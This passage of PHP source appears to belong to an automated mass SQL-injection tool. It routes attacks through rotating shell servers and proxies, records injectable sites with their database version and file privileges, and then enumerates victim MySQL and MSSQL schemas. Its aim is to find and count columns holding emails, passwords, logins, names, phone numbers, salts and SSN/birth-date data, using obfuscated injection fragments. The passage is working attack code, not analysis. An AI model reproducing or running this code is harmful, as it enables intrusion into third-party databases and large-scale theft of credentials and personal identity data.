						if (strstr($content, 'falze')) {
							$this->d($url['posts']['url'] . ':::FALZE');
							$exp = explode('::', $content);
							$ggg = 'FALZE';
						}
						 else {
							$this->d($url['posts']['url'] . ':::OK!!');
							preg_match_all('~<(.*?)>(.*?)<\\/(.*?)>~', $content, $arr);
							$this->d($arr, 'multi HEAD');

							if (isset($arr[2][1])) {
								$file_priv = 0;
								$mysqlbd = 0;
								if ((@$arr[2][7] == 'Y') || (@$arr[2][7] == 'y')) {
									$mysqlbd = 1;
									$file_priv = 1;
								}


								if ((@$arr[2][7] == 'N') || (@$arr[2][7] == 'n')) {
									$mysqlbd = 1;
									$file_priv = 0;
								}


								flush();
								$this->d($arr, 'arr_all');
								$arr[2][6] = substr($arr[2][6], 0, 30);

								if (preg_match('/,/', $arr[2][8])) {
									$this->d('zapytua GOOD !!');
									$zap = true;
								}
								 else {
									if (($arr[2][8] == '') || ($arr[2][8] == 0)) {
										$zap = true;
									}

								}

								$lll = strlen($arr[2][8]);
								if (strstr($arr[0][1], '404 - Categoría no encontrada') || strstr($arr[0][2], 'de visitar esta página')) {
									$this->d('404 - Categoría no encontrada ');

									if (trim($url) != '') {
										fwrite($fh, trim($url) . "\r\n");
									}

								}


								if (!(empty($arr[2][3])) && ($urltic['host'] != '') && ($arr[2][6] != '') && !(empty($urltic['host'])) && ($arr[2][8] != 'Gateway time-out') && ($lll < 55) && ($arr[2][8] != 'An error has occurred while processing your request.') && ($zap == true) && ($arr[2][8] != 'Während der Anfrage ist ein Fehler aufgetreten!')) {
									$arr[2][6] = str_replace(array('\'', '"'), '', $arr[2][6]);
									$arr[2][8] = str_replace(array('\'', '"'), '', $arr[2][8]);

									if ($this->Post->query('UPDATE `posts` SET ' . "\r\n\t\t\t\t\t\t\t\t\t\t" . '`prohod` = 5,' . "\r\n\t\t\t\t\t\t\t\t\t\t" . '`gurl`="' . $arr[2][1] . '",' . "\r\n\t\t\t\t\t\t\t\t\t\t" . '`tables`="' . mysql_real_escape_string($arr[2][8]) . '",' . "\r\n\t\t\t\t\t\t\t\t\t\t" . '`status`=3,' . "\r\n\t\t\t\t\t\t\t\t\t\t" . '`work`="' . $arr[2][6] . '",' . "\r\n\t\t\t\t\t\t\t\t\t\t" . '`sposob`="' . mysql_real_escape_string($arr[2][5]) . '",' . "\r\n\t\t\t\t\t\t\t\t\t\t" . '`method`="' . mysql_real_escape_string($arr[2][2]) . '",' . "\r\n\t\t\t\t\t\t\t\t\t\t" . '`column`="' . $arr[2][4] . '",' . "\r\n\t\t\t\t\t\t\t\t\t\t" . '`mysqlbd`="' . $mysqlbd . '",' . "\r\n\t\t\t\t\t\t\t\t\t\t" . '`file_priv`="' . $file_priv . '",' . "\r\n\t\t\t\t\t\t\t\t\t\t" . '`version`="' . mysql_real_escape_string($arr[2][3]) . '",' . "\r\n\t\t\t\t\t\t\t\t\t\t" . '`tic`=' . $this->getcy($urltic['host']) . ',' . "\r\n\t\t\t\t\t\t\t\t\t\t" . '`sleep` ="' . mysql_real_escape_string($arr[2][9]) . '"' . "\r\n\t\t\t\t\t\t\t\t\t\t" . 'WHERE `domen` ="' . $domen . '" or `domen` ="' . $domen2 . '" or url = "' . $url2 . '"')) {
										$this->d($domen, 'update TRUE');
									}
									 else {
										$this->d($domen, 'update FALSE !');
										$this->d('UPDATE `posts` SET ' . "\r\n\t\t\t\t\t\t\t\t\t\t" . '`prohod` = 5,' . "\r\n\t\t\t\t\t\t\t\t\t\t" . '`gurl`="' . $arr[2][1] . '",' . "\r\n\t\t\t\t\t\t\t\t\t\t" . '`tables`="' . mysql_real_escape_string($arr[2][8]) . '",' . "\r\n\t\t\t\t\t\t\t\t\t\t" . '`status`=3,' . "\r\n\t\t\t\t\t\t\t\t\t\t" . '`work`="' . $arr[2][6] . '",' . "\r\n\t\t\t\t\t\t\t\t\t\t" . '`sposob`="' . mysql_real_escape_string($arr[2][5]) . '",' . "\r\n\t\t\t\t\t\t\t\t\t\t" . '`method`="' . mysql_real_escape_string($arr[2][2]) . '",' . "\r\n\t\t\t\t\t\t\t\t\t\t" . '`column`="' . $arr[2][4] . '",' . "\r\n\t\t\t\t\t\t\t\t\t\t" . '`mysqlbd`="' . $mysqlbd . '",' . "\r\n\t\t\t\t\t\t\t\t\t\t" . '`file_priv`="' . $file_priv . '",' . "\r\n\t\t\t\t\t\t\t\t\t\t" . '`version`="' . mysql_real_escape_string($arr[2][3]) . '",' . "\r\n\t\t\t\t\t\t\t\t\t\t" . '`tic`=' . $this->getcy($urltic['host']) . ',' . "\r\n\t\t\t\t\t\t\t\t\t\t" . '`sleep` ="' . mysql_real_escape_string($arr[2][9]) . '"' . "\r\n\t\t\t\t\t\t\t\t\t\t" . 'WHERE `domen` ="' . $domen . '" or `domen` ="' . $domen2 . '" or url = "' . $url2 . '"');
									}
								}

							}
							 else {
								$this->d($url['posts']['url'] . ':::PUSTO', $url2);
							}
						}

						if (preg_match('/Internal Server Error/i', $arr[0][1]) || ($arr[2][0] == '500 Internal Server Error') || ($arr[2][1] == 'Internal Server Error')) {
							$this->d(' Internal Server Error OTVET');
						}
						 else {
							if ($this->Post->query('UPDATE  `posts` SET  `prohod` = 5 WHERE  `domen` ="' . $domen . '" or `domen` ="' . $domen2 . '" or url = "' . $url2 . '"')) {
								$this->d('good prohod update');
							}
							 else {
								$this->d('FALSE prohod update');
							}

							$this->d('UPDATE  `posts` SET  `prohod` = 5 WHERE  `domen` ="' . $domen . '" or `domen` ="' . $domen2 . '" or url = "' . $url2 . '"');
						}

						curl_multi_remove_handle($cmh, $ch);
						curl_close($ch);

						if (count($newservv) == 0) {
							$newservv = $serv;
						}


						if (0 < count($urls)) {
							echo 'zapusk dopolnitelno<br>';
							$kkk = count($newservv);
							$lll = mt_rand(1, $kkk);
							$urserv = $newservv[$lll];
							$urs_shell = $urserv;
							$urs_one = array_shift($urls);

							if (!(empty($urs_shell))) {
								$urlllll = str_replace('http://', '', trim($urs_one['posts']['url']));
								$ch = $this->create_streem($urs_shell, $urlllll . '::' . $urs_one['posts']['http']);
								$tasks[$urs_one['posts']['url'] . ':::' . $urs_one['posts']['id']] = $ch;
								curl_multi_add_handle($cmh, $ch);
							}

						}

					}

				} while ($mrc == CURLM_CALL_MULTI_PERFORM);
			}

		}

		curl_multi_close($cmh);
		$this->stop();
		exit();
	}

	public function getcountmail()
	{
		if ($this->search_email == false) {
			return false;
		}


		ignore_user_abort(true);
		set_time_limit(0);
		$r = rand(1, 100);
		$this->logs('stepTree zapushen - № ' . $r, 'getcountmail');
		$this->timeStart = $this->start('stepTree', 1);
		$squles = $this->Post->query('SELECT * FROM  `posts` WHERE `getmail`=0 AND `version` LIKE  \'%5.%\' limit 15');
		$count = count($squles);

		if ($count == 0) {
			$this->stop();
			echo '$count==0 stepTree';
			$this->passwordAllsqule();
			exit('netu nische po shagu tree');
		}


		$i = 1;
		$this->d($squles);

		foreach ($squles as $squle ) {
			$this->workup();
			$this->Post->query('UPDATE `posts` SET `getmail`=1  WHERE `id`=' . $squle['posts']['id']);
			$fieldcount = $this->Post->query('SELECT * FROM  `fileds` WHERE  `post_id` =' . $squle['posts']['id']);

			if (0 < count($fieldcount)) {
				$this->d(count($fieldcount), 'count($fieldcount) > 0');
				$this->logs(count($fieldcount) . ' - count($fieldcount) >0:' . $r, 'getcountmail');
				continue;
			}


			$this->logs($squle['posts']['id'] . '- squle_id:' . $r, 'getcountmail');
			$squle['Post'] = $squle['posts'];

			if (2 < strlen($squle['Post']['sleep'])) {
				$set = $squle['Post']['sleep'];
				$this->d($set, 'set');
			}
			 else {
				$set = false;
			}

			$this->mysqlInj = new $this->Injector();
			$this->proxyCheck();
			$this->mysqlInj->inject($squle['Post']['header'] . '::' . $squle['Post']['gurl'], $squle, $set);
			$data = $this->mysqlInj->mysqlGetAllValue('information_schema', 'COLUMNS', array('COLUMN_NAME', 'TABLE_NAME', 'TABLE_SCHEMA'), 0, array(), 'WHERE `COLUMN_NAME` LIKE char(' . $this->charcher('%mail%') . ') AND ( `DATA_TYPE`=char(' . $this->charcher('char') . ') OR `DATA_TYPE`=char(' . $this->charcher('varchar') . ') OR `DATA_TYPE`=char(' . $this->charcher('text') . '))');
			$this->d($data, 'data');

			if (0 < count($data)) {
				$this->workup();
				$url = parse_url($squle['Post']['url']);
				$ip = @gethostbyname($url['host']);

				foreach ($data as $mail ) {
					$mailcount = $this->mysqlInj->mysqlGetCountInsert($mail['TABLE_SCHEMA'], $mail['TABLE_NAME'], 'WHERE `' . $mail['COLUMN_NAME'] . '` LIKE char(' . $this->charcher('%@%') . ')');
					$this->d($mailcount, '$mailcount');
					$this->logs($mailcount . ' - ' . $mail['COLUMN_NAME'] . ' $mailcount:' . $r, 'getcountmail');
					flush();

					if (intval($mailcount) !== 0) {
						if (500 < $mailcount) {
							$fieldcount = $this->Post->query('SELECT * FROM  `fileds` WHERE  `post_id` =\'' . $squle['posts']['id'] . '\' AND `count` = ' . $mailcount);
							$this->d($fieldcount, 'fieldcount');
							$this->d($ip, 'ip');
							$this->d($mail['TABLE_SCHEMA'], 'TABLE_SCHEMA');
							$this->d($mail['TABLE_NAME'], 'TABLE_NAME');
							$this->d($squle['Post']['id'], 'id');
							flush();

							if (count($fieldcount) == 0) {
								$this->d('!!!test!!!');
								$this->data['Filed']['id'] = 0;
								$this->data['Filed']['ipbase'] = $ip . ':' . $mail['TABLE_SCHEMA'] . ':' . $mail['TABLE_NAME'] . ':' . $mail['COLUMN_NAME'];
								$this->data['Filed']['post_id'] = $squle['Post']['id'];
								$this->data['Filed']['table'] = $mail['TABLE_NAME'];
								$this->data['Filed']['label'] = $mail['COLUMN_NAME'];
								$this->data['Filed']['count'] = intval($mailcount);
								$this->data['Filed']['site'] = $squle['Post']['url'];
								$this->data['Filed']['typedb'] = 'mysql';

								if ($this->Filed->save($this->data)) {
									echo 'OK<br>';
								}

							}

						}

					}

				}
			}

		}

		$this->stop();
		$this->logs('stepTree ostanovlen № ' . $r, 'getcountmail');
		exit('okay');
	}

	public function getcountmailMSSQL()
	{
		ignore_user_abort(true);
		set_time_limit(0);
		$r = rand(1, 100);
		$this->logs('stepTree zapushen - № ' . $r, 'getcountmailMSSQL');
		$this->timeStart = $this->start('getcountmailMSSQL', 1);
		$squles = $this->Post->query('SELECT * FROM  `posts` WHERE `getmail`=0 AND `version` LIKE  \'m%\' limit 5');
		$count = count($squles);

		if ($count == 0) {
			$this->stop();
			echo '$count==0 getcountmailMSSQL';
			exit('netu nische po shagu tree');
		}


		$i = 1;
		$this->d($squles);

		foreach ($squles as $squle ) {
			$this->workup();
			$this->Post->query('UPDATE `posts` SET `getmail`=1  WHERE `id`=' . $squle['posts']['id']);
			$fieldcount = $this->Post->query('SELECT * FROM  `fileds` WHERE  `post_id` =' . $squle['posts']['id']);

			if (0 < count($fieldcount)) {
				$this->d(count($fieldcount), 'count($fieldcount) > 0');
				$this->logs(count($fieldcount) . ' - count($fieldcount) >0:' . $r, 'getcountmailMSSQL');
				continue;
			}


			$this->logs($squle['posts']['id'] . '- squle_id:' . $r, 'getcountmailMSSQL');
			$squle['Post'] = $squle['posts'];

			if (2 < strlen($squle['Post']['sleep'])) {
				$set = $squle['Post']['sleep'];
				$this->d($set, 'set');
			}
			 else {
				$set = false;
			}

			$this->mysqlInj = new $this->Injector();
			$this->proxyCheck();
			$this->mysqlInj->inject($squle['Post']['header'] . '::' . $squle['Post']['gurl'], $squle, $set);

			if (preg_match('/microsoft/i', $squle[0]['posts']['version'])) {
				$this->mysqlInj->mssql = true;
				$this->d('MSSQL!');
			}


			$data = $this->mysqlInj->mssqlGetLikeEmail();
			$this->d($data, 'data T');

			if (0 < count($data)) {
				$this->workup();
				$url = parse_url($squle['Post']['url']);
				$ip = gethostbyname($url['host']);

				foreach ($data as $key => $value ) {
					$mail2 = explode(':::', $value);
					$mail['TABLE_SCHEMA'] = $mail2[0];
					$mail['TABLE_NAME'] = $mail2[1];
					$mail['COLUMN_NAME'] = $mail2[2];
					$mailcount = $this->mysqlInj->mssqlGetCount($mail['TABLE_SCHEMA'], $mail['TABLE_NAME']);
					$this->d($mailcount, '$mailcount');
					$this->logs($mailcount . ' - ' . $mail['COLUMN_NAME'] . ' $mailcount:' . $r, 'getcountmailMSSQL');
					flush();

					if (intval($mailcount) !== 0) {
						if (6000 < $mailcount) {
							$fieldcount = $this->Post->query('SELECT * FROM  `fileds` WHERE  `post_id` =\'' . $squle['posts']['id'] . '\' AND `count` = ' . $mailcount);
							$this->d($fieldcount, 'fieldcount');
							$this->d($ip, 'ip');
							$this->d($mail['TABLE_SCHEMA'], 'TABLE_SCHEMA');
							$this->d($mail['TABLE_NAME'], 'TABLE_NAME');
							$this->d($squle['Post']['id'], 'id');
							flush();

							if (count($fieldcount) == 0) {
								$this->d('!!!test!!!');
								$this->data['Filed']['id'] = 0;
								$this->data['Filed']['ipbase'] = $ip . ':' . $mail['TABLE_SCHEMA'] . ':' . $mail['TABLE_NAME'] . ':' . $mail['COLUMN_NAME'];
								$this->data['Filed']['post_id'] = $squle['Post']['id'];
								$this->data['Filed']['table'] = $mail['TABLE_NAME'];
								$this->data['Filed']['label'] = $mail['COLUMN_NAME'];
								$this->data['Filed']['count'] = intval($mailcount);
								$this->data['Filed']['site'] = $squle['Post']['url'];
								$this->data['Filed']['typedb'] = 'mssql';

								if ($this->Filed->save($this->data)) {
									echo 'OK<br>';
								}

							}

						}

					}

				}
			}

		}

		$this->stop();
		$this->logs('stepTree ostanovlen № ' . $r, 'getcountmailMSSQL');
		exit('okay');
	}

	public function passwordAllsqule()
	{
		$poles = $this->Filed->query('SELECT * FROM  `fileds` WHERE `password`=\'\' limit 10');

		if (0 < count($poles)) {
			$this->timeStart = $this->start('passwordAllsqule', 1);
		}
		 else {
			$this->stop();
			exit();
		}

		$r = rand(1, 100);
		$this->logs('stepFor zapushen - № ' . $r, 'passwordAllsqule');

		foreach ($poles as $pole ) {
			$this->workup();
			$password = ':';
			$this->FindPasswordInSqule($pole['fileds']['id']);
		}

		$this->stop();
		$this->logs('stepFor ostanovlen № ' . $r, 'passwordAllsqule');
		exit('fse');
	}

	public function FindPasswordInSqule($idf)
	{
		$pass = $this->passwords;
		$field = $this->Filed->findbyid($idf);
		$squle = $this->Filed->query('SELECT * FROM  `posts` WHERE `id` = ' . $field['Filed']['post_id']);
		$this->mysqlInj = new $this->Injector();

		if (preg_match('/microsoft/i', $squle[0]['posts']['version'])) {
			$this->mysqlInj->mssql = true;
			$this->d('MSSQL!');
		}


		$this->proxyCheck();

		if (2 < strlen($squle[0]['posts']['sleep'])) {
			$set = $squle[0]['posts']['sleep'];
		}
		 else {
			$set = false;
		}

		$this->mysqlInj->inject($squle[0]['posts']['header'] . '::' . $squle[0]['posts']['gurl'], $squle[0], $set);
		$bd = explode(':', $field['Filed']['ipbase']);
		$this->d($bd, '$bd');
		$password = ':';

		foreach ($pass as $pps ) {
			$this->workup();

			if ($this->mysqlInj->mssql == true) {
				$bd_new = $bd[1];
				$pps = $this->mysqlInj->charcher_mssql('%' . $pps . '%');
				$table_new = $this->mysqlInj->charcher_mssql($bd[2]);
				$mysql = $this->mysqlInj->mssqlGetValue('(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from ' . $bd_new . '.information_schema.columns where table_name =' . $table_new . ' AND column_name like ' . $pps . ' order BY column_name  ASC) sq order BY column_name ASC)');
				$mysql['COLUMN_NAME'] = $mysql['(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from ' . $bd_new . '.information_schema.columns where table_name =' . $table_new . ' AND column_name like ' . $pps . ' order BY column_name  ASC) sq order BY column_name ASC)'];
			}
			 else {
				$mysql = $this->mysqlInj->mysqlGetValue('information_schema', 'COLUMNS', 'COLUMN_NAME', 0, array(), ' WHERE `TABLE_NAME`=char(' . $this->charcher($bd[2]) . ') AND `TABLE_SCHEMA`=char(' . $this->charcher($bd[1]) . ') AND `COLUMN_NAME` LIKE char(' . $this->charcher('%' . $pps . '%') . ')');
			}

			$this->d($mysql, '$mysql');

			if (isset($mysql['COLUMN_NAME'])) {
				$password .= '' . $mysql['COLUMN_NAME'] . ':';
				continue;
			}

		}

		$this->Filed->query('UPDATE  `fileds` SET  `password` =  "' . $password . '" WHERE  `id` =' . $idf);
		$this->d('UPDATE  `fileds` SET  `password` =  "' . $password . '" WHERE  `id` =' . $idf);
		$this->d($password);
	}

	public function loginAllsqule()
	{
		$poles = $this->Filed->query('SELECT * FROM  `fileds` WHERE `login`=\'\' limit 20');

		if (0 < count($poles)) {
			$this->timeStart = $this->start('loginAllsqule', 1);
		}
		 else {
			$this->stop();
			exit();
		}

		$r = rand(1, 100);
		$this->logs('stepFor zapushen - № ' . $r, 'loginAllsqule');

		foreach ($poles as $pole ) {
			$this->workup();
			$password = ':';
			$this->FindLoginInSqule($pole['fileds']['id']);
		}

		$this->stop();
		$this->logs('stepFor ostanovlen № ' . $r, 'loginAllsqule');
		exit('fse');
	}

	public function FindLoginInSqule($idf)
	{
		$pass = $this->logins;
		$field = $this->Filed->findbyid($idf);
		$squle = $this->Filed->query('SELECT * FROM  `posts` WHERE `id` = ' . $field['Filed']['post_id']);
		$this->mysqlInj = new $this->Injector();

		if (preg_match('/microsoft/i', $squle[0]['posts']['version'])) {
			$this->mysqlInj->mssql = true;
			$this->d('MSSQL!');
		}


		$this->proxyCheck();

		if (2 < strlen($squle[0]['posts']['sleep'])) {
			$set = $squle[0]['posts']['sleep'];
		}
		 else {
			$set = false;
		}

		$this->mysqlInj->inject($squle[0]['posts']['header'] . '::' . $squle[0]['posts']['gurl'], $squle[0], $set);
		$bd = explode(':', $field['Filed']['ipbase']);
		$this->d($bd, '$bd');
		$password = ':';

		foreach ($pass as $pps ) {
			$this->workup();

			if ($this->mysqlInj->mssql == true) {
				$bd_new = $bd[1];
				$pps = $this->mysqlInj->charcher_mssql('%' . $pps . '%');
				$table_new = $this->mysqlInj->charcher_mssql($bd[2]);
				$mysql = $this->mysqlInj->mssqlGetValue('(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from ' . $bd_new . '.information_schema.columns where table_name =' . $table_new . ' AND column_name like ' . $pps . ' order BY column_name  ASC) sq order BY column_name ASC)');
				$mysql['COLUMN_NAME'] = $mysql['(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from ' . $bd_new . '.information_schema.columns where table_name =' . $table_new . ' AND column_name like ' . $pps . ' order BY column_name  ASC) sq order BY column_name ASC)'];
			}
			 else {
				$mysql = $this->mysqlInj->mysqlGetValue('information_schema', 'COLUMNS', 'COLUMN_NAME', 0, array(), ' WHERE `TABLE_NAME`=char(' . $this->charcher($bd[2]) . ') AND `TABLE_SCHEMA`=char(' . $this->charcher($bd[1]) . ') AND `COLUMN_NAME` LIKE char(' . $this->charcher('%' . $pps . '%') . ')');
			}

			$this->d($mysql, '$mysql');

			if (isset($mysql['COLUMN_NAME'])) {
				$password .= '' . $mysql['COLUMN_NAME'];
				continue;
			}

		}

		$this->d($password);
// visit $pole[fileds][id] to $idf
		$this->Filed->query('UPDATE  `fileds` SET  `login` =  "' . $password . '" WHERE  `id` =' . $idf);
	}

	public function nameAllsqule()
	{
		$poles = $this->Filed->query('SELECT * FROM  `fileds` WHERE `name`=\'\' limit 20');

		if (0 < count($poles)) {
			$this->timeStart = $this->start('nameAllsqule', 1);
		}
		 else {
			$this->stop();
			exit();
		}

		$r = rand(1, 100);
		$this->logs('stepFor zapushen - № ' . $r, 'nameAllsqule');

		foreach ($poles as $pole ) {
			$this->workup();
			$password = ':';
			$this->FindNameInSqule($pole['fileds']['id']);
		}

		$this->stop();
		$this->logs('stepFor ostanovlen № ' . $r, 'nameAllsqule');
		exit('fse');
	}

	public function FindNameInSqule($idf)
	{
		$pass = array('name', 'nome', 'nombre', 'pavadinimas', 'Numm', 'naam', 'nazwa');
		$field = $this->Filed->findbyid($idf);
		$squle = $this->Filed->query('SELECT * FROM  `posts` WHERE `id` = ' . $field['Filed']['post_id']);
		$this->mysqlInj = new $this->Injector();

		if (preg_match('/microsoft/i', $squle[0]['posts']['version'])) {
			$this->mysqlInj->mssql = true;
			$this->d('MSSQL!');
		}


		$this->proxyCheck();

		if (2 < strlen($squle[0]['posts']['sleep'])) {
			$set = $squle[0]['posts']['sleep'];
		}
		 else {
			$set = false;
		}

		$this->mysqlInj->inject($squle[0]['posts']['header'] . '::' . $squle[0]['posts']['gurl'], $squle[0], $set);
		$bd = explode(':', $field['Filed']['ipbase']);
		$this->d($bd, '$bd');
		$password = ':';

		foreach ($pass as $pps ) {
			$this->workup();

			if ($this->mysqlInj->mssql == true) {
				$bd_new = $bd[1];
				$pps = $this->mysqlInj->charcher_mssql('%' . $pps . '%');
				$table_new = $this->mysqlInj->charcher_mssql($bd[2]);
				$mysql = $this->mysqlInj->mssqlGetValue('(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from ' . $bd_new . '.information_schema.columns where table_name =' . $table_new . ' AND column_name like ' . $pps . ' order BY column_name  ASC) sq order BY column_name ASC)');
				$mysql['COLUMN_NAME'] = $mysql['(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from ' . $bd_new . '.information_schema.columns where table_name =' . $table_new . ' AND column_name like ' . $pps . ' order BY column_name  ASC) sq order BY column_name ASC)'];
			}
			 else {
				$mysql = $this->mysqlInj->mysqlGetValue('information_schema', 'COLUMNS', 'COLUMN_NAME', 0, array(), ' WHERE `TABLE_NAME`=char(' . $this->charcher($bd[2]) . ') AND `TABLE_SCHEMA`=char(' . $this->charcher($bd[1]) . ') AND `COLUMN_NAME` LIKE char(' . $this->charcher('%' . $pps . '%') . ')');
			}

			$this->d($mysql, '$mysql');

			if (isset($mysql['COLUMN_NAME'])) {
				$password .= '' . $mysql['COLUMN_NAME'];
				continue;
			}

		}

		$this->d($password);
// visit $pole[fileds][id] to $idf
		$this->Filed->query('UPDATE  `fileds` SET  `name` =  "' . $password . '" WHERE  `id` =' . $idf);
	}

	public function phoneAllsqule()
	{
		$poles = $this->Filed->query('SELECT * FROM  `fileds` WHERE `phone`=\'\' limit 20');

		if (0 < count($poles)) {
			$this->timeStart = $this->start('phoneAllsqule', 1);
		}
		 else {
			$this->stop();
			exit();
		}

		$r = rand(1, 100);
		$this->logs('stepFor zapushen - № ' . $r, 'phoneAllsqule');

		foreach ($poles as $pole ) {
			$this->workup();
			$this->FindPhoneInSqule($pole['fileds']['id']);
		}

		$this->stop();
		$this->logs('stepFor ostanovlen № ' . $r, 'phoneAllsqule');
		exit('fse');
	}

	public function FindPhoneInSqule($idf)
	{
		$pass = array('phon', 'telefo', 'fón', 'síminn', 'teléfono', 'téléphone');
		$field = $this->Filed->findbyid($idf);
		$squle = $this->Filed->query('SELECT * FROM  `posts` WHERE `id` = ' . $field['Filed']['post_id']);
		$this->mysqlInj = new $this->Injector();

		if (preg_match('/microsoft/i', $squle[0]['posts']['version'])) {
			$this->mysqlInj->mssql = true;
			$this->d('MSSQL!');
		}


		$this->proxyCheck();

		if (2 < strlen($squle[0]['posts']['sleep'])) {
			$set = $squle[0]['posts']['sleep'];
		}
		 else {
			$set = false;
		}

		$this->mysqlInj->inject($squle[0]['posts']['header'] . '::' . $squle[0]['posts']['gurl'], $squle[0], $set);
		$bd = explode(':', $field['Filed']['ipbase']);
		$this->d($bd, '$bd');
		$password = ':';

		foreach ($pass as $pps ) {
			$this->workup();

			if ($this->mysqlInj->mssql == true) {
				$bd_new = $bd[1];
				$pps = $this->mysqlInj->charcher_mssql('%' . $pps . '%');
				$table_new = $this->mysqlInj->charcher_mssql($bd[2]);
				$mysql = $this->mysqlInj->mssqlGetValue('(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from ' . $bd_new . '.information_schema.columns where table_name =' . $table_new . ' AND column_name like ' . $pps . ' order BY column_name  ASC) sq order BY column_name ASC)');
				$mysql['COLUMN_NAME'] = $mysql['(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from ' . $bd_new . '.information_schema.columns where table_name =' . $table_new . ' AND column_name like ' . $pps . ' order BY column_name  ASC) sq order BY column_name ASC)'];
			}
			 else {
				$mysql = $this->mysqlInj->mysqlGetValue('information_schema', 'COLUMNS', 'COLUMN_NAME', 0, array(), ' WHERE `TABLE_NAME`=char(' . $this->charcher($bd[2]) . ') AND `TABLE_SCHEMA`=char(' . $this->charcher($bd[1]) . ') AND `COLUMN_NAME` LIKE char(' . $this->charcher('%' . $pps . '%') . ')');
			}

			$this->d($mysql, '$mysql');

			if (isset($mysql['COLUMN_NAME'])) {
				$password .= '' . $mysql['COLUMN_NAME'];
				continue;
			}

		}

		$this->d($password);
		$this->Filed->query('UPDATE  `fileds` SET  `phone` =  "' . $password . '" WHERE  `id` =' . $idf);
	}

	public function saltAllsqule()
	{
		$poles = $this->Filed->query('SELECT * FROM  `fileds` WHERE `salt` is null limit 20');
		$this->d($poles, '$poles');

		if (0 < count($poles)) {
			$this->timeStart = $this->start('soltAllsqule', 1);
		}
		 else {
			$this->stop();
			exit();
		}

		$r = rand(1, 100);
		$this->logs('stepFor zapushen - № ' . $r, 'saltAllsqule');

		foreach ($poles as $pole ) {
			$this->workup();
			$this->FindSaltInSqule($pole['fileds']['id']);
		}

		$this->stop();
		$this->logs('stepFor ostanovlen № ' . $r, 'saltAllsqule');
		exit('fse');
	}

	public function FindSaltInSqule($idf)
	{
		$pass = array('salt');
		$field = $this->Filed->findbyid($idf);
		$squle = $this->Filed->query('SELECT * FROM  `posts` WHERE `id` = ' . $field['Filed']['post_id']);

		if (preg_match('/microsoft/i', $squle[0]['posts']['version'])) {
			$this->mysqlInj->mssql = true;
			$this->d('MSSQL!');
		}


		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();

		if (2 < strlen($squle[0]['posts']['sleep'])) {
			$set = $squle[0]['posts']['sleep'];
			$this->d($set, 'pass SET SOL');
		}
		 else {
			$set = false;
		}

		$this->mysqlInj->inject($squle[0]['posts']['header'] . '::' . $squle[0]['posts']['gurl'], $squle[0], $set);
		$bd = explode(':', $field['Filed']['ipbase']);
		$password = ':';

		foreach ($pass as $pps ) {
			$this->workup();

			if ($this->mysqlInj->mssql == true) {
				$bd_new = $bd[1];
				$pps = $this->mysqlInj->charcher_mssql('%' . $pps . '%');
				$table_new = $this->mysqlInj->charcher_mssql($bd[2]);
				$mysql = $this->mysqlInj->mssqlGetValue('(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from ' . $bd_new . '.information_schema.columns where table_name =' . $table_new . ' AND column_name like ' . $pps . ' order BY column_name  ASC) sq order BY column_name ASC)');
				$mysql['COLUMN_NAME'] = $mysql['(/**/sElEcT /**/dIsTiNcT top 1 column_name from (select distinct top 1 column_name from ' . $bd_new . '.information_schema.columns where table_name =' . $table_new . ' AND column_name like ' . $pps . ' order BY column_name  ASC) sq order BY column_name ASC)'];
			}
			 else {
				$mysql = $this->mysqlInj->mysqlGetValue('information_schema', 'COLUMNS', 'COLUMN_NAME', 0, array(), ' WHERE `TABLE_NAME`=char(' . $this->charcher($bd[2]) . ') AND `TABLE_SCHEMA`=char(' . $this->charcher($bd[1]) . ') AND `COLUMN_NAME` LIKE char(' . $this->charcher('%' . $pps . '%') . ')');
			}

			if (isset($mysql['COLUMN_NAME'])) {
				$password .= '' . $mysql['COLUMN_NAME'];
				continue;
			}

		}

		$this->Filed->query('UPDATE  `fileds` SET  `salt` =  "' . $password . '" WHERE  `id` =' . $idf);
	}

	public function getCountSsn()
	{
		if ($this->ssn_check == false) {
			return false;
		}


		$this->timeStart = $this->start('getCountSsn', 1);
     $start_time = $this->timeStart;
		$poles = $this->Post->query('SELECT * FROM `posts` WHERE `status`=3 AND `prohod`=5 AND `ssn_check` =0 AND `version` LIKE  \'%5.%\'  limit 15');

		if (0 < count($poles)) {
			$this->d('netuuuuuuu');
        //$this->stop();
        //exit('GetCountSSN::No tasks');
		}
		 else {
			$this->ssn_16();
			$this->stop('getCountSsn', $start_time);
			exit('GetCountSSN::Execute SSN_16 finished');
		}

		$r = rand(1, 100);

		foreach ($poles as $pole ) {
			$this->workup();
			$this->Filed->query('UPDATE  `posts` SET  `ssn_check` =  1 WHERE  `id` =' . $pole['posts']['id']);
			$this->FindCountSsnOne($pole['posts']['id']);
			$this->tableOrder = '';
		}

		$this->ssn_16();
		$this->stop('getCountSsn', $start_time);
		exit('GetCountSSN::Finished');
	}

	public function FindCountSsnOne($idf)
	{
		$this->d('FindCountOrderOne - zapusk');
		$pass = $this->ssn_dob;
		$squle = $this->Post->query('SELECT * FROM `posts` WHERE id=' . $idf . ' limit 1');
		$squle = $squle[0];
		$this->d($squle, 'squle');
		$post_id = $squle['posts']['id'];
		$domen = $squle['posts']['domen'];
		$this->workup();
		$this->mysqlInj = new $this->Injector();
		$this->proxyCheck();

		if (2 < strlen($squle['posts']['sleep'])) {
			$set = $squle['posts']['sleep'];
			$this->d($set, 'pass SET');
		}
		 else {
			$set = false;
		}

		$this->mysqlInj->inject($squle['posts']['header'] . '::' . $squle['posts']['gurl'], $squle, $set);
		$password = '';
		$i = 1;
		$this->d($pass);

		foreach ($pass as $pps ) {
			$pss = trim($pps);
			$this->workup();
